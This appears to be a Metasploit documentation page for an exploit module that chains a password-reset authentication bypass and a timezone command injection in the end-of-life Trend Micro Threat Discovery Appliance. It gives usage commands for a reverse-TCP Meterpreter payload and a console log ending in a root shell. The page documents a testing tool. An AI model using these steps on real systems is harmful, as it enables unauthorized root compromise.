{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi","result":{"data":{"moduleMetadataJson":{"id":"a1f2ac22-3ae4-5dad-a520-dfff53195d86","name":"Trend Micro Threat Discovery Appliance admin_sys_time.cgi Remote Command Execution","fullname":"exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi","description":"This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance.\n          The first is an authentication bypass vulnerability via a file delete in logoff.cgi\n          which resets the admin password back to 'admin' upon a reboot (CVE-2016-7552).\n          The second is a cmdi flaw using the timezone parameter in the admin_sys_time.cgi\n          interface (CVE-2016-7547).\n\n          Note: You have the option to use the authentication bypass or not since it requires\n          that the server is rebooted. The password reset will render the authentication useless.\n          Typically, if an administrator cant login, they will bounce the box. Therefore, this\n          module performs a heartbeat request until the box is bounced and then attempts to login\n          and to perform the command injection. This module has been tested on version 2.6.1062r1\n          of the appliance.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi","documentationSlug":"/modules/documentation/exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance. The first is an authentication\nbypass vulnerability via a file delete in logoff.cgi which resets the admin password back to 'admin' upon a\nreboot (CVE-2016-7552). The second is a cmdi flaw using the timezone parameter in the admin<em>sys</em>time.cgi interface (CVE-2016-7547).</p>\n<p>Note: You have the option to use the authentication bypass or not since it requires that the server is rebooted.\nThe password reset will render the authentication useless. Typically, if an administrator cant login, they will bounce the box.\nTherefore, this module performs a heart beat request until the box is bounced and then attempts to login and to\nperform the command injection. This module has been tested on version 2.6.1062r1 of the appliance.</p>\n<p>Trend Micro are not patching this vulnerability since this\nproduct is now (<a href=\"https://success.trendmicro.com/solution/1105727-list-of-end-of-life-eol-end-of-support-eos-trend-micro-products\">EOL</a>).</p>\n<p><img src=\"http://srcincite.io/poc/CVE-2016-7547.gif\" alt=\"Demo\"></p>\n<h3 id=\"vulnerable-application-installation-steps\" style=\"position:relative;\"><a href=\"#vulnerable-application-installation-steps\" aria-label=\"vulnerable application installation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application Installation Steps</h3>\n<p>List the steps needed to make sure this thing works</p>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Download the ISO from (<a href=\"http://download.trendmicro.com/products/tda/TDA_InstallationCD.2.6.1062r1.en_US.iso\">Trend Micro's</a>) download site.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Setup the VM to have 2 NIC's, 100 Gig HD and 4096 RAM.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Click through the default install.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> You are ready to burn.</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the appliance</li>\n<li>Start metasploit</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi</code></li>\n<li>Do: <code class=\"language-text\">set payload linux/x86/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>The exploit will reset the admin password, now reboot the VM.</li>\n<li>After reboot, you receive a root shell</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"password\" style=\"position:relative;\"><a href=\"#password\" aria-label=\"password permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PASSWORD</h3>\n<p>Password for the system.  Default is <code class=\"language-text\">admin</code>.</p>\n<h3 id=\"authbypass\" style=\"position:relative;\"><a href=\"#authbypass\" aria-label=\"authbypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AUTHBYPASS</h3>\n<p>Bypass the system's authentication.  Defaults to <code class=\"language-text\">true</code></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"trendmicro-threat-discovery-appliance-261062r1\" style=\"position:relative;\"><a href=\"#trendmicro-threat-discovery-appliance-261062r1\" aria-label=\"trendmicro threat discovery appliance 261062r1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Trendmicro Threat Discovery Appliance 2.6.1062r1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">saturn:metasploit-framework mr_me$ ./msfconsole -qr scripts/trend.rc \n[*] Processing scripts/trend.rc for ERB directives.\nresource (scripts/trend.rc)&gt; use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi\nresource (scripts/trend.rc)&gt; set RHOST 192.168.100.2\nRHOST =&gt; 192.168.100.2\nresource (scripts/trend.rc)&gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nresource (scripts/trend.rc)&gt; set LHOST 192.168.100.13\nLHOST =&gt; 192.168.100.13\nresource (scripts/trend.rc)&gt; exploit\n[*] Exploit running as background job.\n\n[*] Started reverse TCP handler on 192.168.100.13:4444 \n[*] Bypassing authentication...\nmsf exploit(trendmicro_threat_discovery_admin_sys_time_cmdi) &gt; \n[+] The password has been reset!\n[*] Waiting for the reboot...\n[*] 192.168.100.2:443 - Starting up our web service on http://192.168.100.13:1337/nnDBuOUMuKnxP ...\n[*] Using URL: http://0.0.0.0:1337/nnDBuOUMuKnxP\n[*] Local IP: http://192.168.100.13:1337/nnDBuOUMuKnxP\n[+] Logged in\n[*] 192.168.100.2:443 - Sending the payload to the server...\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 192.168.100.2\n[*] Meterpreter session 1 opened (192.168.100.13:4444 -&gt; 192.168.100.2:46140) at 2016-09-23 14:59:08 -0500\n[+] Deleted /tmp/rpNDXQZTB\n[*] Server stopped.\n\nmsf exploit(trendmicro_threat_discovery_admin_sys_time_cmdi) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; shell\nProcess 3846 created.\nChannel 1 created.\n\n\nBusyBox v1.00 (2010.10.13-06:52+0000) Built-in shell (ash)\nEnter &#39;help&#39; for a list of built-in commands.\n\n/bin/sh: can&#39;t access tty; job control turned off\n/opt/TrendMicro/MinorityReport/www/cgi-bin # id\nid\nuid=0(root) gid=0(root)\n/opt/TrendMicro/MinorityReport/www/cgi-bin #</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a1f2ac22-3ae4-5dad-a520-dfff53195d86"}}}